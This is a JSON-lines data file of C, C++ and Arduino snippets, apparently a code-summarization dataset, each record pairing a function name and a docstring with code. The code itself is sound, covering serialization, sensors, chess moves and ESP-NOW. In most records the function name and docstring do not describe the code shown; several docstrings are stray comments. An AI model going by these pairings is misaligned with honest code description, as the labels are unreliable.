{"content":"{'function_name': 'global_write_state_to_capnp', 'docstring': '\/\/ Serialize the multipart upload state', 'code': 'Status global_write_state_from_capnp(\\n    const Query& query,\\n    const capnp::GlobalWriteState::Reader& state_reader,\\n    GlobalOrderWriter* global_writer,\\n    const SerializationContext context) {\\n  auto write_state = global_writer->get_global_state();\\n\\n  if (state_reader.hasCellsWritten()) {\\n    auto& cells_written = write_state->cells_written_;\\n    auto cell_written_reader = state_reader.getCellsWritten();\\n    for (const auto& entry : cell_written_reader.getEntries()) {\\n      auto key = std::string_view{entry.getKey().cStr(), entry.getKey().size()};\\n      cells_written[std::string{key}] = entry.getValue();\\n    }\\n  }\\n\\n  if (state_reader.hasLastCellCoords()) {\\n    auto single_coord_reader = state_reader.getLastCellCoords();\\n    if (single_coord_reader.hasCoords() &&\\n        single_coord_reader.hasSingleOffset() &&\\n        single_coord_reader.hasSizes()) {\\n      std::vector<std::vector<uint8_t>> coords;\\n      std::vector<uint64_t> sizes;\\n      std::vector<uint64_t> single_offset;\\n      for (const auto& t : single_coord_reader.getCoords()) {\\n        auto& last = coords.emplace_back();\\n        last.reserve(t.size());\\n        for (const auto& v : t) {\\n          last.emplace_back(v);\\n        }\\n      }\\n\\n      sizes.reserve(single_coord_reader.getSizes().size());\\n      for (const auto& size : single_coord_reader.getSizes()) {\\n        sizes.emplace_back(size);\\n      }\\n      single_offset.reserve(single_coord_reader.getSingleOffset().size());\\n      for (const auto& so : single_coord_reader.getSingleOffset()) {\\n        single_offset.emplace_back(so);\\n      }\\n\\n      write_state->last_cell_coords_.emplace(\\n          query.array_schema(), coords, sizes, single_offset);\\n    }\\n  }\\n\\n  write_state->last_hilbert_value_ = state_reader.getLastHilbertValue();\\n\\n  if (state_reader.hasFragMeta()) {\\n    auto frag_meta = write_state->frag_meta_;\\n    auto frag_meta_reader = state_reader.getFragMeta();\\n    RETURN_NOT_OK(fragment_metadata_from_capnp(\\n        query.array_schema_shared(), frag_meta_reader, frag_meta));\\n  }\\n\\n  \/\/ Deserialize the multipart upload state\\n  if (state_reader.hasMultiPartUploadStates()) {\\n    auto multipart_reader = state_reader.getMultiPartUploadStates();\\n    if (multipart_reader.hasEntries()) {\\n      for (auto entry : multipart_reader.getEntries()) {\\n        VFS::MultiPartUploadState deserialized_state;\\n        auto state = entry.getValue();\\n        auto buffer_uri =\\n            std::string_view{entry.getKey().cStr(), entry.getKey().size()};\\n\\n        if (state.hasUploadId()) {\\n          deserialized_state.upload_id = state.getUploadId();\\n        }\\n        if (state.hasStatus()) {\\n          deserialized_state.status =\\n              Status(std::string(state.getStatus().cStr()), \"\");\\n        }\\n        deserialized_state.part_number = entry.getValue().getPartNumber();\\n        if (state.hasCompletedParts()) {\\n          auto& parts = deserialized_state.completed_parts;\\n          for (auto part : state.getCompletedParts()) {\\n            parts.emplace_back();\\n            parts.back().part_number = part.getPartNumber();\\n            if (part.hasETag()) {\\n              parts.back().e_tag = std::string(part.getETag().cStr());\\n            }\\n          }\\n        }\\n\\n        if (state.hasBufferedChunks()) {\\n          deserialized_state.buffered_chunks.emplace();\\n          auto& chunks = deserialized_state.buffered_chunks.value();\\n          for (auto chunk : state.getBufferedChunks()) {\\n            chunks.emplace_back();\\n            chunks.back().size = chunk.getSize();\\n            if (chunk.hasUri()) {\\n              chunks.back().uri = std::string(chunk.getUri().cStr());\\n            }\\n          }\\n        }\\n\\n        RETURN_NOT_OK(global_writer->set_multipart_upload_state(\\n            std::string{buffer_uri},\\n            deserialized_state,\\n            context == SerializationContext::CLIENT));\\n      }\\n    }\\n  }\\n\\n  return Status::Ok();\\n}'}","id":453}
{"content":"{'function_name': 'loop', 'docstring': '\/\/Writes value of Output to servo', 'code': \"float readPosition() {\\n  delay(40);                                                            \/\/Don't set too low or echos will run into eachother.      \\n  \\n  \\nconst int pingPin = 7;\\n\\nlong duration, cm;\\nunsigned long now = millis();\\n  pinMode(pingPin, OUTPUT);\\n  digitalWrite(pingPin, LOW);\\n  delayMicroseconds(2);\\n  digitalWrite(pingPin, HIGH);\\n  delayMicroseconds(5);\\n  digitalWrite(pingPin, LOW);\\n\\n\\n  pinMode(pingPin, INPUT);\\n  duration = pulseIn(pingPin, HIGH);\\n\\n  cm = duration\/(29*2);\\n  \\n  \\n  if(cm > 30)     \/\/ 30 cm is the maximum position for the ball\\n  {cm=30;}\\n  \\n  \\n  Serial.println(cm);\\n  \\n  return cm;                                          \/\/Returns distance value.\\n}\"}","id":456}
{"content":"{'function_name': 'x86id_fixup', 'docstring': '\/* (CLIENT_OS == OS_LINUX) *\/', 'code': 'static u32 x86GetTransmetaId(u32 maxfunc)\\n{\\n  \/* - Basic identification -\\n  ** Crusoe TM3x00   : ID = 0x5042\\n  ** Crusoe TM5x00   : ID = 0x5043\\n  ** Efficeon TM8x00 : ID = 0xF02x \/ 0xF03x\\n  *\/\\n  return x86GetDefaultId(maxfunc) | (VENDOR_TRANSMETA << 28);\\n}'}","id":461}
{"content":"{'function_name': 'countSetBits', 'docstring': '\/*Brian and Kernigham Method: do bitwise AND between n & n-1. \\r\\n    This operation turns off the rightmost set bit of n.  *\/', 'code': 'int main()\\r\\n{\\r\\n\\t int t;\\r\\n\\t cin>>t;\/\/ input testcases\\r\\n\\t while(t--) \/\/while testcases exist\\r\\n\\t {\\r\\n\\t       int n;\\r\\n\\t       cin>>n; \/\/input n\\r\\n\\t       \\r\\n\\t       cout << countSetBits(n) << endl;\/\/ print the answer\\r\\n\\t  }\\r\\n\\t  return 0;\\r\\n}'}","id":462}
{"content":"{'function_name': 'handle', 'docstring': '\/\/ https:\/\/github.com\/mapbox\/mapnik-vector-tile\/blob\/master\/examples\/c%2B%2B\/tileinfo.cpp', 'code': 'int main(int argc, char **argv) {\\n\\textern int optind;\\n\\t\/\/ extern char *optarg;\\n\\tint i;\\n\\n\\twhile ((i = getopt(argc, argv, \"\")) != -1) {\\n\\t\\tusage(argv);\\n\\t}\\n\\n\\tif (argc == optind + 4) {\\n\\t\\tdecode(argv[optind], atoi(argv[optind + 1]), atoi(argv[optind + 2]), atoi(argv[optind + 3]));\\n\\t} else if (argc == optind + 1) {\\n\\t\\tdecode(argv[optind], -1, -1, -1);\\n\\t} else {\\n\\t\\tusage(argv);\\n\\t}\\n\\n\\treturn 0;\\n}'}","id":473}
{"content":"{'function_name': 'CreateCommandQueuesWithCUcount', 'docstring': '\/\/ only implemented for CPU', 'code': 'AMF_RESULT CreateCommandQueuesVIAocl(int deviceIndex, int32_t flag1, cl_command_queue *pcmdQueue1, int32_t flag2, cl_command_queue *pcmdQueue2, cl_device_type clDeviceType)\\n{\\n    bool AllIsOK = true;\\n\\n#ifdef _WIN32\\n    HMODULE GPUUtilitiesDll = NULL;\\n    GPUUtilitiesDll = LoadLibraryA(\"GPUUtilities.dll\");\\n    if (NULL == GPUUtilitiesDll)\\n        return AMF_FAIL;\\n\\n    typedef int(WINAPI * getDeviceAndContextType)(int devIdx, cl_context *pContext, cl_device_id *pDevice, cl_device_type clDeviceType);\\n    getDeviceAndContextType getDeviceAndContext = nullptr;\\n    getDeviceAndContext = (getDeviceAndContextType)GetProcAddress(GPUUtilitiesDll, \"getDeviceAndContext\");\\n    if (NULL == getDeviceAndContext)\\n        return AMF_FAIL;\\n\\n    typedef cl_command_queue(WINAPI * createQueueType)(cl_context context, cl_device_id device, int, int);\\n    createQueueType createQueue = nullptr;\\n    createQueue = (createQueueType)GetProcAddress(GPUUtilitiesDll, \"createQueue\");\\n    if (NULL == createQueue)\\n        return AMF_FAIL;\\n#endif\\n\\n    cl_context clContext = NULL;\\n    cl_device_id clDevice = NULL;\\n    \/\/get context of open device via index 0,1,2,...\\n    getDeviceAndContext(deviceIndex, &clContext, &clDevice, clDeviceType);\\n    if (NULL == clContext)\\n        return AMF_FAIL;\\n    if (NULL == clDevice)\\n        return AMF_FAIL;\\n    clRetainDevice(clDevice);\\n    clRetainContext(clContext);\\n\\n    if (NULL != pcmdQueue1)\\n    { \/\/user requested one queue\\n        cl_command_queue tempQueue = createQueue(clContext, clDevice, 0, 0);\\n        if (NULL == tempQueue)\\n        {\\n            fprintf(stdout, \"createQueue failed to create cmdQueue1 \");\\n            AllIsOK = false;\\n        }\\n        *pcmdQueue1 = tempQueue;\\n    }\\n\\n    if (NULL != pcmdQueue2)\\n    { \/\/user requested second queue\\n        cl_command_queue tempQueue = createQueue(clContext, clDevice, 0, 0);\\n        if (NULL == tempQueue)\\n        {\\n            fprintf(stdout, \"createQueue failed to create cmdQueue2 \");\\n            AllIsOK = false;\\n        }\\n        *pcmdQueue2 = tempQueue;\\n    }\\n\\n    if (false == AllIsOK)\\n    {\\n        if (NULL != pcmdQueue1)\\n        {\\n            if (NULL != *pcmdQueue1)\\n            {\\n                clReleaseCommandQueue(*pcmdQueue1);\\n                *pcmdQueue1 = NULL;\\n            }\\n        }\\n        if (NULL != pcmdQueue2)\\n        {\\n            if (NULL != *pcmdQueue2)\\n            {\\n                clReleaseCommandQueue(*pcmdQueue2);\\n                *pcmdQueue2 = NULL;\\n            }\\n        }\\n    }\\n\\n    if (NULL != clContext)\\n    {\\n        clReleaseContext(clContext);\\n        clContext = NULL;\\n    }\\n    if (NULL != clDevice)\\n    {\\n        clReleaseDevice(clDevice);\\n        clDevice = NULL;\\n    }\\n\\n    return AllIsOK ? AMF_OK : AMF_FAIL;\\n}'}","id":477}
{"content":"{'function_name': 'createRecipes', 'docstring': '\/\/ end of i for', 'code': 'int main(int argc, char *argv[])\\n{\\n\\tjson ingredients = jsonFromFile(\"..\/data\/ingredients.json\");\\n\\n\\tcreateRecipes(ingredients);\\n\\tvector<Recipe> recipes = Recipes::Instance().GetRecipes();\\n\\tfor(auto& r : recipes){\\n\\t\\tcout << r << endl;\\n\\t}\\n\\n\\tjson json_recipes = recipes;\\n\\t\/\/cout << setw(4) << json_recipes << endl;\\n\\n\\tofstream out_file(\"..\/data\/recipes.json\", ios::out);\\n\\tout_file << setw(4) << json_recipes;\\n\\n\\treturn 0;\\n}'}","id":489}
{"content":"{'function_name': 'normalPoint', 'docstring': '\/\/Normal point of (pt) on the plane (r(0) x + r(1) y + r(2) z + r(3) = 0)', 'code': 'Vector3 normalPoint(const Vector3& pt, const Vector3& p, const Vector3& e)\\n{\\n  \/\/Normal point of (pt) on the line (p + t e)\\n\\n  double t = dot(e, Vector3(pt-p))\/dot(e,e);\\n\\n  return Vector3(p + t*e);\\n}'}","id":490}
{"content":"{'function_name': 'OnDataSent', 'docstring': '\/\/ Copies the sender mac address to a string\\r', 'code': 'void setup() {\\r\\n \\r\\n  Serial.begin(115200);\\r\\n \\r\\n  WiFi.mode(WIFI_STA);\\r\\n \\r\\n  if (esp_now_init() != ESP_OK) {\\r\\n    Serial.println(\"Error initializing ESP-NOW\");\\r\\n    return;\\r\\n  }\\r\\n\\r\\n  esp_now_register_send_cb(OnDataSent);\\r\\n\\r\\n  \/\/ register peer\\r\\n  esp_now_peer_info_t peerInfo;\\r\\n  peerInfo.channel = 0;  \\r\\n  peerInfo.encrypt = false;\\r\\n    \\r\\n  memcpy(peerInfo.peer_addr, broadcastAddress1, 6);\\r\\n  if (esp_now_add_peer(&peerInfo) != ESP_OK){\\r\\n    Serial.println(\"Failed to add peer\");\\r\\n    return;\\r\\n  }\\r\\n  \\r\\n  memcpy(peerInfo.peer_addr, broadcastAddress2, 6);\\r\\n  if (esp_now_add_peer(&peerInfo) != ESP_OK){\\r\\n    Serial.println(\"Failed to add peer\");\\r\\n    return;\\r\\n  }\\r\\n  memcpy(peerInfo.peer_addr, broadcastAddress3, 6);\\r\\n  if (esp_now_add_peer(&peerInfo) != ESP_OK){\\r\\n    Serial.println(\"Failed to add peer\");\\r\\n    return;\\r\\n  }\\r\\n}'}","id":496}
{"content":"{'function_name': 'sendPDBCommand', 'docstring': '\/\/ Re-enable interrupts', 'code': 'void sendBonusScore(long ScoreX_in, byte player_in)\\n{\\n  Score100K = (ScoreX_in\/100000.0);\\n  Score10K = ((ScoreX_in-(Score100K*100000.0))\/10000.0);\\n  ScoreK = ((ScoreX_in-(Score100K*100000.0)-(Score10K*10000.0))\/1000.0);\\n  Score100 = ((ScoreX_in-(Score100K*100000.0)-(Score10K*10000.0)-(ScoreK*1000.0))\/100.0);\\n  Score10 = ((ScoreX_in-(Score100K*100000.0)-(Score10K*10000.0)-(ScoreK*1000.0)-(Score100*100.0))\/10.0);\\n  Score1 = (ScoreX_in-(Score100K*100000.0)-(Score10K*10000.0)-(ScoreK*1000.0)-(Score100*100.0)-(Score10*10.0));\\n  wireWriteData[0] = ASCII_DOLLAR;\\n  wireWriteData[1] = ASCII_C;\\n  wireWriteData[2] = ASCII_A;\\n  wireWriteData[3] = ASCII_N;\\n  wireWriteData[4] = (player_in + 4); \/\/ PinScore Unit IDs, 4 thru 7 \/\/(player + 4); \/\/ PinScore ID\\n  wireWriteData[5] = Score100K;\\n  wireWriteData[6] = Score10K;\\n  wireWriteData[7] = ScoreK;\\n  wireWriteData[8] = Score100;\\n  wireWriteData[9] = Score10;\\n  wireWriteData[10] = Score1;\\n  wireWriteData[11] = ASCII_CR;\\n\\n  Wire.beginTransmission(4); \/\/ transmit to player one Arduino LED\\n  Wire.write(wireWriteData,12);\\n  Wire.endTransmission();    \/\/ stop transmitting\\n\\n  return;\\n}'}","id":506}
{"content":"{'function_name': 'moveToPoint', 'docstring': '\/\/Serial.println(\"done moving\");', 'code': 'boolean positionCalibration()\\n{\\n  \\n  \/\/step one: make sure that the carriage isn\\'t already in front of the sensor\\n  if (analogRead(PIN_IR_SENSOR) > IR_THRESHOLD) \/\/if voltage is greater than threshold voltage\\n    \/\/aka if distance is less than threshold distance\\n  {\\n\/\/    Serial.println(\"saw it early\");\\n    delay(500);\\n    for(int i = 0; i < DIP_STEPS; i++) \/\/we\\'re not dipping, but it\\'s convenient to just go the same distance\\n    {\\n      motorLStep(1);\\n      motorRStep(1);\\n      delay(motorDelay);\\n    }\\n    delay(500);\\n    \/\/now check again:\\n\/\/    if (analogRead(PIN_IR_SENSOR) > IR_THRESHOLD)\\n\/\/      return false; \/\/calibration fails if sensor is still picking something up.\\n  }\\n  \\n  \/\/ok, now we should be ready to start lifting the carriage\\n  int count = 0;  \/\/counts the steps moved upwards\\n  int reading = 0; \/\/will be used to store the sensor reading\\n\/\/  Serial.println(\"scanning...\");\\n\/\/  delay(500);\\n  while(1)\\n  {\\n    motorLStep(-1); \/\/pull both motors up a step\\n    motorRStep(-1);\\n    delay(motorDelay); \/\/delay before reading sensor to give it time to finish moving\\n    \\n    \\n    if (analogRead(PIN_IR_SENSOR) > IR_THRESHOLD) \/\/have we found it?\\n      break; \/\/yes!\\n      \\n    if (++count >= MAX_CALIBRATION_STEPS) \/\/have we moved too much (aka missed it?)\\n    {  \/\/if so, move back down to where you started, and report a failure\\n      for(int i = 0; i < MAX_CALIBRATION_STEPS + CALIBRATION_Y_CORRECTION_STEPS; i++)\\n      {\\n        motorLStep(1);\\n        motorRStep(1);\\n        delay(motorDelay);\\n      }\\n      return positionCalibration();\\n    }\\n  } \/\/end while loop\\n  \\n\/\/  Serial.println(\"found it\");\\n\/\/    delay(500);\\n  \/\/at this point we have found the carriage, now we just need to convert that voltage\\n  \/\/reading into an x distance\\n  \\n  for(int i = 0; i < CALIBRATION_ADJUSTMENT_STEPS; i++)\\n  {\\n    motorLStep(-1);\\n    motorRStep(-1);\\n    delay(motorDelay);\\n  }\\n  \\n\/\/  Serial.println(\"reading\");\\n  delay(500); \/\/let it settle slightly before reading\\n  reading = analogRead(PIN_IR_SENSOR);\\n\\n  \/\/this equation was made using line-fitting in excel with actual measurements\\n  double distance = pow(double(reading),-1.198);\\n  distance = distance * 169721.1;\/\/62930.3;\\n\/\/  Serial.print(\"distance: \");\\n\/\/  Serial.println(distance);\\n\/\/  delay(500);  \\n  \\n  \/\/set the current coordinates based on where it is relative to the IR sensor\\n  cCur.x = IR_X + distance; \/\/assumes it\\'s mounted on the left side\\n  cCur.y = IR_Y;\\n  \\n  \/\/calculate the lengths of the fishing line\\n  lengthL = getDistFromPoint(cCur, cMotorL);\\n  lengthR = getDistFromPoint(cCur, cMotorR);\\n  \\n  if ((distance > 121) || (distance < 73)) \/\/are you in the ideal sensor range yet?\\n  {                  \/\/if not, then move halfway from where you are to the center of the ideal range\\n    coord cAdjust;\\n    cAdjust.x = IR_X + 97 + (distance-97)\/2;\\n    cAdjust.y = IR_Y;\\n    moveToPoint(cAdjust);\\n    return finePositionCalibration();\\n  }\\n  \\n  \/\/at this point it has calibrated the y, and fine-tuned the x\\n  \/\/for better precision, let\\'s re-calibrate the y\\n  \\n  \/\/send it back down below the sensor\\n  for(int i = 0; i < 2*CALIBRATION_ADJUSTMENT_STEPS; i++)\\n  {\\n    motorLStep(1);\\n    motorRStep(1);\\n    delay(motorDelay);\\n  }\\n  \/\/now come back up\\n  delay(1000);\\n  while (analogRead(PIN_IR_SENSOR) <= IR_THRESHOLD) \/\/while it\\'s not seen\\n  {\\n    motorLStep(-1);\\n    motorRStep(-1);\\n    delay(motorDelay);\\n  }\\n  \\n  for(int i = 0; i < CALIBRATION_ADJUSTMENT_STEPS; i++)\\n  {\\n    motorLStep(-1);\\n    motorRStep(-1);\\n    delay(motorDelay);\\n  }\\n  \\n  \/\/now the y coord (IR_Y) should be more accurate\\n  \\n  return true;\\n}'}","id":508}
{"content":"{'function_name': 'MimeOleGetMixedSection', 'docstring': '\/\/ If Root is empty\\r', 'code': 'MIMEOLEAPI MimeOleGetAlternativeSection(\\r\\n                                        IMimeMessageTree   *pTree,\\r\\n                                        LPHBODY             phAlternative,\\r\\n                                        boolean            *pfMultiple)\\r\\n{\\r\\n    \/\/ Locals\\r\\n    HRESULT     hr=S_OK;\\r\\n    HBODY       hTemp;\\r\\n    FINDBODY    rFind;\\r\\n\\r\\n    \/\/ Invalid Args\\r\\n    if (NULL == pTree || NULL == phAlternative)\\r\\n        return TrapError(E_INVALIDARG);\\r\\n\\r\\n    \/\/ Init\\r\\n    ZeroMemory(&rFind, sizeof(FINDBODY));\\r\\n\\r\\n    \/\/ Find first multipart\/mixed section\\r\\n    rFind.pszPriType = (LPSTR)STR_CNT_MULTIPART;\\r\\n    rFind.pszSubType = (LPSTR)STR_SUB_ALTERNATIVE;\\r\\n\\r\\n    \/\/ Find First\\r\\n    if (SUCCEEDED(pTree->FindFirst(&rFind, phAlternative)))\\r\\n    {\\r\\n        \/\/ Is there another multipart\/mixed section\\r\\n        if (pfMultiple && SUCCEEDED(pTree->FindNext(&rFind, &hTemp)))\\r\\n            *pfMultiple = TRUE;\\r\\n\\r\\n        \/\/ Done\\r\\n        goto exit;\\r\\n    }\\r\\n\\r\\n    \/\/ Init\\r\\n    if (pfMultiple)\\r\\n        *pfMultiple = FALSE;\\r\\n\\r\\n    \/\/ If no Create, fail\\r\\n    hr = TrapError(MIME_E_NOT_FOUND);\\r\\n\\r\\nexit:\\r\\n    \/\/ Done\\r\\n    return hr;\\r\\n}'}","id":511}
{"content":"{'function_name': 'cek_kanan', 'docstring': '\/\/ mengembalikan nilai jarak dari variable lokal ke variable global', 'code': 'int cek_kiri() {\\n  \/\/ robot melihat kearah kiri\\n  servo.write(lihat_kiri);\\n  delay(500);\\n\\n  \/\/ menyimpan nilai baca sensor kedalam variable lokal\\n  int jarak = baca_sensor();\\n  delay(100);\\n\\n  \/\/ robot melihat kearah depan\\n  servo.write(lihat_depan);\\n\\n  \/\/ mengirim nilai jarak dari scope lokal ke global\\n  return jarak;\\n  delay(100);\\n}'}","id":516}
{"content":"{'function_name': 'main', 'docstring': '\/\/ Print Winner', 'code': 'set <vector <int> > possiblemoves (vector <vector <int> > board, int row, int col)\\n{\\n  set <vector <int> > possible;\\n\\n  \/\/ Pawn\\n  if (abs(board[row][col]) == 1)\\n  {\\n    \/\/ Direction of movement (based on whether white or black)\\n    int dir = board[row][col] > 0 ? -1 : 1;\\n\\n    \/\/ If there is no piece directly in front\\n    if (row + dir >= 0 && board[row + dir][col] == 0)\\n    {\\n      possible.insert({row + dir, col});\\n\\n      \/\/ If pawn is at starting point there is no piece two steps in front\\n      bool starting = (dir == 1 && row == 1) || (dir == -1 && row == 6);\\n      if (starting && row + 2 * dir >= 0 && board[row + 2 * dir][col] == 0)\\n        possible.insert({row + 2 * dir, col});\\n    }\\n\\n    \/\/ If there are opponent pieces to the front diagonal\\n    if (col + 1 < board[0].size() && board[row][col] * board[row + dir][col + 1] < 0) possible.insert({row + dir, col + 1});\\n    if (col - 1 >= 0 && board[row][col] * board[row + dir][col - 1] < 0) possible.insert({row + dir, col - 1});\\n  }\\n\\n  \/\/ Rook and Queen: sides\\n  if (abs(board[row][col]) == 2 || abs(board[row][col]) == 5)\\n  {\\n    \/\/ Sides\\n    int xdir[4] = {1, -1, 0, 0};\\n    int ydir[4] = {0, 0, 1, -1};\\n    for (int i = 0; i < 4; i++)\\n    {\\n      int x = row + xdir[i];\\n      int y = col + ydir[i];\\n      while (x >= 0 && x < board.size() && y >= 0 && y < board[0].size() &&\\n             board[x][y] == 0)\\n      {\\n        possible.insert({x, y});\\n        x += xdir[i];\\n        y += ydir[i];\\n      }\\n      if (x >= 0 && x < board.size() && y >= 0 && y < board[0].size() &&\\n          board[row][col] * board[x][y] < 0) possible.insert({x, y});\\n    }\\n  }\\n\\n  \/\/ Knight\\n  if (abs(board[row][col]) == 3)\\n  {\\n    int xdir[8] = {2, 2, 1, 1, -1, -1, -2, -2};\\n    int ydir[8] = {1, -1, 2, -2, 2, -2, 1, -1};\\n\\n    for (int i = 0; i < 8; i++)\\n    {\\n      int x = row + xdir[i];\\n      int y = col + ydir[i];\\n      if (x >= 0 && x < board.size() && y >= 0 && y < board[0].size() &&\\n          board[row][col] * board[x][y] <= 0)\\n        possible.insert({x, y});\\n    }\\n  }\\n\\n  \/\/ Bishop and Queen: Diagonals\\n  if (abs(board[row][col]) == 4 || abs(board[row][col]) == 5)\\n  {\\n    int xdir[4] = {1, 1, -1, -1};\\n    int ydir[4] = {-1, 1, -1, 1};\\n\\n    for (int i = 0; i < 4; i++)\\n    {\\n      int x = row + xdir[i];\\n      int y = col + ydir[i];\\n      while (x >= 0 && x < board.size() && y >= 0 && y < board[0].size() &&\\n             board[x][y] == 0)\\n      {\\n        possible.insert({x, y});\\n        x += xdir[i];\\n        y += ydir[i];\\n      }\\n      if (x >= 0 && x < board.size() && y >= 0 && y < board[0].size() &&\\n          board[row][col] * board[x][y] < 0) possible.insert({x, y});\\n    }\\n  }\\n\\n  \/\/ King\\n  if (abs(board[row][col]) == 6)\\n  {\\n    int xdir[8] = {-1, -1, -1, 0, 0, 1, 1, 1};\\n    int ydir[8] = {-1, 0, 1, -1, 1, -1, 0, 1};\\n\\n    for (int i = 0; i < 8; i++)\\n    {\\n      int x = row + xdir[i];\\n      int y = col + ydir[i];\\n      if (x >= 0 && x < board.size() && y >= 0 && y < board[0].size() &&\\n          board[row][col] * board[x][y] <= 0) possible.insert({x, y});\\n    }\\n  }\\n\\n  return possible;\\n}'}","id":524}
{"content":"{'function_name': 'checkRoMeoButtons', 'docstring': '\/\/ check if a button is already pressed', 'code': 'int getButton(unsigned int input)\\n{\\n\\tint k;\\n\\tfor (k = 0; k < NUM_KEYS; k++)\\n\\t{\\n\\t\\tif (input < adc_key_val[k])\\n\\t\\t{\\n\\t\\t\\treturn k+1;\\t\\t\/\/ number of the pressed button\\n\\t\\t}\\n\\t}\\n\\t\/\/ if you come so far, no valid key could be identified -> return -1\\n\\treturn -1;\\n}'}","id":526}
{"content":"{'function_name': 'zeroCrossDetector', 'docstring': '\/\/next moment in time i.e., the (n+1)th moment', 'code': 'int counter(int y_zc, int* x_c) {\\n\\tint y_zcc;\\n\\t\\n\\tif (y_zc != 0) {\\n\\t\\ty_zcc = *x_c + 1;\\n\\t}\\n\\telse {\\n\\t\\ty_zcc = 0;\\n\\t}\\n\\n\\t\/\/calculations to determine the state for the\\n\\t\/\/next moment in time i.e., the (n+1)th moment\\n\\tif (y_zc != 0) {\\n\\t\\t*x_c = 0;\\n\\t}\\n\\telse {\\n\\t\\t*x_c = *x_c + 1;\\n\\t}\\n\\n\\treturn y_zcc;\\n}'}","id":531}
{"content":"{'function_name': 'ReadDataFromFileAndPrintLengthWiseWithoutDuplicates', 'docstring': '\/\/pair<set<string>::iterator, bool> validator;', 'code': 'int main(int argc, _TCHAR* argv[])\\n{\\n\\tcout << \"Please Uncomment section in code to run an example\" << endl;\\n\\t\/\/ Create file and put some data\\n\\t\/\/FILE * handle=NULL;\\n\\n\\t\/\/ OpenAFile(handle);\\n\\n\\t\/\/ getchar();\\n\\n\\t\/\/if(handle)\\n\\t{\\n\\t\\t\/\/PutDataIntoFile();\\n\\t}\\n\\t\/\/ getchar();\\n\\t\/\/\/ read that data in sequential order\\n\\t{\\n\\t\\t\/\/ ReadDataFromFileAndPrintForwards();\\n\\t}\\n\\t\/\/ getchar();\\n\\t{\\n\\t\\t\/*\\tRead the input one line at a time and then write the lines out in\\n\\t\\t\\treverse order, so that the last input line is printed first, then the\\n\\t\\t\\tsecond last input line, and so on.\\n\\t\\t*\/\\n\\t\\t\/\/ Approach : read 1 line by 1 from physical file.\\n\\n\\t\\t\/\/ ReadDataFromFileAndPrintBackwards();\\n\\t}\\n\\t\/\/ getchar();\\n\\t{\\n\\t\\t\/\/  Read the first 50 lines of input and then write them out in reverse\\n\\t\\t\/\/\\torder.Read the next 50 lines and then write them out in reverse\\n\\t\\t\/\/\\torder.Do this until there are no more lines left to read, at which\\n\\t\\t\/\/\\tpoint any remaining lines should be output in reverse order.\\n\\t\\t\/\/\\tIn other words, your output will start with the 50th line, then the\\n\\t\\t\/\/\\t49th, then the 48th, and so on down to the first line.This will be\\n\\t\\t\/\/\\tfollowed by the 100th line, followed by the 99th, and so on down to\\n\\t\\t\/\/\\tthe 51st line.And so on.\\n\\t\\t\/\/\\tYour code should never have to store more than 50 lines at any given\\n\\t\\t\/\/\\ttime.\\n\\n\\t\\t\/\/  ReadDataFromFileAndPrintBackwards50();\\n\\t}\\n\\t\/\/ getchar();\\n\\t{\\n\\t\\t\/\/\\tRead the input one line at a time.At any point after reading the\\n\\t\\t\/\/\\tfirst 42 lines, if some line is blank(i.e., a string of length 0), then\\n\\t\\t\/\/\\toutput the line that occurred 42 lines prior to that one.For example,\\n\\t\\t\/\/\\tif Line 242 is blank, then your program should output line 200.\\n\\t\\t\/\/\\tThis program should be implemented so that it never stores more\\n\\t\\t\/\/\\tthan 43 lines of the input at any given time.\\n\\n\\t\\t\/\/\\tReadDataFromFileAndPrintWithQueue42();\\n\\t}\\n\\t\/\/ getchar();\\n\\t{\\n\\t\\t\/\/\\tRead the input one line at a time and write each line to the output\\n\\t\\t\/\/\\tif it is not a duplicate of some previous input line.Take special care\\n\\t\\t\/\/\\tso that a file with a lot of duplicate lines does not use more memory\\n\\t\\t\/\/\\tthan what is required for the number of unique lines.\\n\\n\\t\\t\/\/ ReadDataFromFileAndPrintWithoutDuplicates();\\n\\t}\\n\\t\/\/ getchar();\\n\\t{\\n\\t\\t\/\/\\tRead the input one line at a time and write each line to the output\\n\\t\\t\/\/\\tonly if you have already read this line before. (The end result is that\\n\\t\\t\/\/\\tyou remove the first occurrence of each line.) Take special care so\\n\\t\\t\/\/\\tthat a file with a lot of duplicate lines does not use more memory\\n\\t\\t\/\/\\tthan what is required for the number of unique lines.\\n\\n\\t\\t\/\/ ReadDataFromFileAndPrintOnlyDuplicates();\\n\\t}\\n\\t\/\/ getchar();\\n\\t{\\n\\t\\t\/\/  Read the entire input one line at a time.Then output all lines sorted by length,\\n\\t\\t\/\/  with the shortest lines \ufb01rst.In the case where two lines have the same length,\\n\\t\\t\/\/  resolve their order using the usual sorted order\\n\\t\\t\/\/  Duplicate lines should be printed only once\\n\\n\\t\\t\/\/\\tReadDataFromFileAndPrintLengthWiseWithoutDuplicates();\\n\\t}\\n\\t\/\/ getchar();\\n\\t{\\n\\t\\t\/\/ Do the same as the previous question except that duplicate lines should be \\n\\t\\t\/\/ printed the same number of times that they appear in the input.\\n\\n\\t\\t\/\/ ReadDataFromFileAndPrintLengthWiseWithDuplicates();\\n\\t}\\n\\t\/\/ getchar();\\n\\t{\\n\\t\\t\/\/\\tRead the entire input one line at a time and then output the \\n\\t\\t\/\/\\teven numbered lines(starting with the \ufb01rst line, line 0) \\n\\t\\t\/\/\\tfollowed by the odd - numbered lines.\\n\\n\\t\\t\/\/\\tReadDataAndPrintOddEven();\\n\\t}\\n\\t\/\/ getchar();\\n\\t{\\n\\t\\t\/\/\\tRead the entire input one line at a time and randomly permute \\n\\t\\t\/\/\\tthe lines before outputting them.\\n\\t\\t\/\/\\tTo be clear : You should not modify the contents of any line. \\n\\t\\t\/\/\\tInstead, the same collection of lines should be printed, but in a random order\\n\\n\\t\\t\/\/\\tReadDataAndPrintInRandomOrder();\\n\\t}\\n\\tgetchar();\\n\\n\\treturn 0;\\n}'}","id":533}
